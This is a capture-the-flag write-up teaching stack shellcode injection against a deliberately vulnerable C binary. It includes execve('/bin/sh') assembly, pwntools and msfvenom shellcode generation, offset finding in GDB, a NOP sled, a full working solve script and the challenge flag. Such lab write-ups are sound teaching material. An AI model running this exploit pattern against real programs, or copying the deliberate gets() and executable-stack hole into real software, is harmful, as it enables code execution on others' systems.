---
title: "Pwn - Shellcode Injection"
description: "Injecting custom shellcode onto the stack and redirecting execution to it — classic code execution when NX is disabled."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                              |
|------------|------------------------------------|
| Category   | Binary Exploitation                |
| Difficulty | Medium                             |
| Points     | 300                                |
| Flag       | `zemi{sh3llc0d3_1nj3ct10n_101}`    |

## Challenge Files

Download the challenge files to get started:

- [shellcode.c](/Website/challenges/pwn-shellcode-injection/shellcode.c)
- [Makefile](/Website/challenges/pwn-shellcode-injection/Makefile)
- [flag.txt](/Website/challenges/pwn-shellcode-injection/flag.txt)

## Introduction

In a ret2win challenge, we redirected execution to a function that already existed in the binary. But what if there is no convenient `win()` function? If the stack is **executable** (NX/DEP disabled), we can inject our own machine code — **shellcode** — directly into the buffer and jump to it. This is one of the oldest exploitation techniques and the reason NX (No-eXecute) was invented.

## What Is NX (No-eXecute)?

Modern systems mark memory pages as either writable or executable, but not both. This is called **NX** (No-eXecute) on Linux or **DEP** (Data Execution Prevention) on Windows. The stack is writable (your local variables go there) but not executable.

When NX is **disabled**, the stack is both writable and executable. We can place machine code on the stack and jump to it.

Check binary protections:

```bash
checksec --file=shellcode
```

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Key findings: **NX disabled** and **Has RWX segments** — the stack is executable.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>

// Compiled: gcc -no-pie -fno-stack-protector -z execstack -o shellcode shellcode.c

void vuln() {
    char buffer[256];
    printf("Buffer is at: %p\n", buffer);
    printf("Enter your payload: ");
    gets(buffer);
    printf("Received!\n");
}

int main() {
    printf("=== Shellcode Injection Challenge ===\n");
    vuln();
    return 0;
}
```

Key observations:
- `-z execstack` makes the stack executable (NX disabled)
- The binary conveniently **leaks the buffer address** with `printf("%p", buffer)`
- 256-byte buffer gives us plenty of room for shellcode
- No canary, no PIE — straightforward exploitation

## Step 1 — Understand What Shellcode Is

Shellcode is raw machine code that, when executed, performs some action — typically spawning a shell (`/bin/sh`). For a CTF where we need to read a flag file, we can use shellcode that either:
- Spawns a shell (then we `cat flag.txt`)
- Directly opens, reads, and prints `flag.txt`

Here is a minimal x86-64 Linux shellcode that executes `execve("/bin/sh", NULL, NULL)`:

```nasm
; 23 bytes - execve("/bin/sh", NULL, NULL)
xor    rsi, rsi          ; rsi = NULL (argv)
push   rsi               ; push NULL terminator
mov    rdi, 0x68732f2f6e69622f  ; "/bin//sh" in little-endian
push   rdi
push   rsp
pop    rdi               ; rdi = pointer to "/bin//sh"
xor    rdx, rdx          ; rdx = NULL (envp)
push   59                ; syscall number for execve
pop    rax
syscall
```

Assembled, this becomes bytes like `\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e...`.

## Step 2 — Generate Shellcode with pwntools

Instead of hand-writing assembly, pwntools has built-in shellcode generators:

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# Generate execve("/bin/sh") shellcode
shellcode = asm(shellcraft.sh())
print(f"Shellcode length: {len(shellcode)} bytes")
print(f"Shellcode: {shellcode.hex()}")
```

You can also generate shellcode to read a specific file:

```python
# Shellcode that reads and prints flag.txt
shellcode = asm(shellcraft.cat('flag.txt'))
print(f"Length: {len(shellcode)} bytes")
```

Alternatively, you can use `msfvenom` from Metasploit:

```bash
msfvenom -p linux/x64/exec CMD="cat flag.txt" -f python -b '\x00'
```

The `-b '\x00'` flag avoids null bytes, which would terminate string reads in `gets()`.

## Step 3 — Calculate the Offset

We need to find how far the buffer is from the return address:

```bash
gdb ./shellcode
```

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0000000000401152 <+0>:     push   rbp
   0x0000000000401153 <+1>:     mov    rbp,rsp
   0x0000000000401156 <+4>:     sub    rsp,0x100           # 256 bytes for buffer
   0x000000000040115d <+11>:    lea    rax,[rbp-0x100]     # buffer at rbp-0x100
   ...
```

- Buffer starts at `rbp - 0x100` (256 bytes)
- Saved RBP is 8 bytes
- Offset to return address: `256 + 8 = 264 bytes`

Verify with a cyclic pattern:

```python
from pwn import *
p = process('./shellcode')
p.recvuntil(b"at: ")
buf_addr = int(p.recvline().strip(), 16)
p.sendline(cyclic(300))
p.wait()
# Check core dump or GDB for crash offset
```

```gdb
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(300).decode())")
(gdb) x/gx $rsp
0x7fffffffe1a8:    0x6161617a61616179
```

```python
from pwn import *
offset = cyclic_find(0x6161617a61616179)
print(f"Offset: {offset}")  # 264
```

## Step 4 — The NOP Sled Technique

A **NOP sled** is a sequence of `NOP` instructions (`\x90` on x86) placed before the shellcode. If we are not 100% sure of the exact address where our shellcode starts, a NOP sled gives us a "landing zone" — any jump into the NOP sled will slide execution forward into the shellcode.

```
+----------------------------------+
| NOP NOP NOP NOP NOP NOP NOP ... |  <-- land anywhere here
| NOP NOP NOP [shellcode starts]  |      and slide into shellcode
| shellcode bytes ...              |
+----------------------------------+
```

In this challenge the binary leaks the exact buffer address, so a NOP sled is not strictly necessary — but it is good practice and accounts for small address variations.

## Step 5 — Build the Payload

The payload structure:

```
[NOP sled] [shellcode] [padding] [return address -> buffer]
|<-------- 264 bytes ---------->| |<--- 8 bytes --->|
```

We need:
- NOP sled + shellcode + padding = 264 bytes total
- Return address = leaked buffer address (points into our NOP sled)

## Step 6 — Exploit

```python
from pwn import *

context.arch = 'amd64'

# Generate shellcode that reads flag.txt
shellcode = asm(shellcraft.cat('flag.txt'))
log.info(f"Shellcode length: {len(shellcode)} bytes")

offset = 264

# Run locally
p = process('./shellcode')

# Read the leaked buffer address
p.recvuntil(b"at: ")
buf_addr = int(p.recvline().strip(), 16)
log.info(f"Buffer address: {hex(buf_addr)}")

# Build payload
nop_sled = b"\x90" * (offset - len(shellcode))  # fill remaining space with NOPs
payload  = nop_sled + shellcode                   # NOPs + shellcode = 264 bytes
payload += p64(buf_addr)                          # return into the NOP sled

p.sendlineafter(b"payload: ", payload)

output = p.recvall(timeout=2)
print(output.decode())

p.close()
```

```
[*] Shellcode length: 42 bytes
[+] Starting local process './shellcode': pid 54321
[*] Buffer address: 0x7fffffffe0b0
Received!
zemi{sh3llc0d3_1nj3ct10n_101}
```

## Full pwntools Solve Script

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('./shellcode')

# Two shellcode options:

# Option A: Read flag.txt directly
shellcode = asm(shellcraft.cat('flag.txt'))

# Option B: Spawn a shell (useful for interactive exploration)
# shellcode = asm(shellcraft.sh())

log.info(f"Shellcode: {len(shellcode)} bytes")

# Offset: 256 (buffer) + 8 (saved RBP) = 264
offset = 264

# Ensure shellcode fits
assert len(shellcode) <= offset, "Shellcode too large!"

# Start the local process
p = process('./shellcode')

# Parse the leaked buffer address
p.recvuntil(b"at: ")
leak = p.recvline().strip()
buf_addr = int(leak, 16)
log.info(f"Buffer @ {hex(buf_addr)}")

# Construct the payload
#   [NOP sled] [shellcode] [return address]
nop_len = offset - len(shellcode)
payload  = b"\x90" * nop_len      # NOP sled for reliability
payload += shellcode               # our code
payload += p64(buf_addr)           # return to start of buffer (NOP sled)

log.info(f"Payload size: {len(payload)} bytes")

# Send the payload
p.sendlineafter(b"payload: ", payload)

# Get output
try:
    flag = p.recvall(timeout=3).decode()
    print(flag)
except:
    p.interactive()

p.close()
```

## Why NX/DEP Prevents This

On a modern binary compiled without `-z execstack`:

```bash
checksec --file=modern_binary
```

```
    NX:       NX enabled
```

If NX is enabled and you try to jump to shellcode on the stack, the CPU raises a segfault because the stack page is marked as non-executable. The page table entry has the NX bit set, and the CPU checks this on every instruction fetch.

This is why techniques like **ret2libc** and **ROP chains** were developed — they reuse existing executable code instead of injecting new code.

## Avoiding Null Bytes

Since `gets()` stops reading at a newline (`\n`, `0x0a`), and many string functions stop at null bytes (`0x00`), your shellcode must avoid these bytes. Strategies:

- Use `xor reg, reg` instead of `mov reg, 0` (avoids null bytes)
- Use `push/pop` instead of `mov` for small constants
- Use pwntools' encoder: `shellcode = asm(shellcraft.sh())` already avoids nulls
- Use `msfvenom -b '\x00\x0a'` to encode around bad characters

```python
# Check for bad bytes
shellcode = asm(shellcraft.cat('flag.txt'))
bad = [i for i, b in enumerate(shellcode) if b in (0x00, 0x0a)]
if bad:
    print(f"Bad bytes at positions: {bad}")
else:
    print("No bad bytes!")
```

## Tools Used

- **checksec** — verify binary protections (NX disabled, no canary, no PIE)
- **GDB** — disassemble functions, find offsets, debug crashes
- **pwntools** — shellcode generation (`shellcraft`), cyclic patterns, process interaction
- **msfvenom** — alternative shellcode generation with bad-byte avoidance
- **objdump** — static disassembly of the binary

## Lessons Learned

- **Shellcode injection** is the classic exploitation technique: write code to the stack, jump to it
- **NX/DEP** was specifically invented to prevent this — it marks the stack as non-executable
- A **NOP sled** gives you a wider landing zone and accounts for small address uncertainties
- **Null bytes** and **newlines** in shellcode break exploits that rely on string functions — always check for bad characters
- The binary must **leak** or you must **guess** the buffer address to jump to it — ASLR makes this much harder
- `-z execstack` is a compilation flag that disables NX — you will see it in CTF challenges but rarely in production
- This technique is largely obsolete in modern exploitation, but understanding it is essential for learning NX bypass techniques like ret2libc and ROP
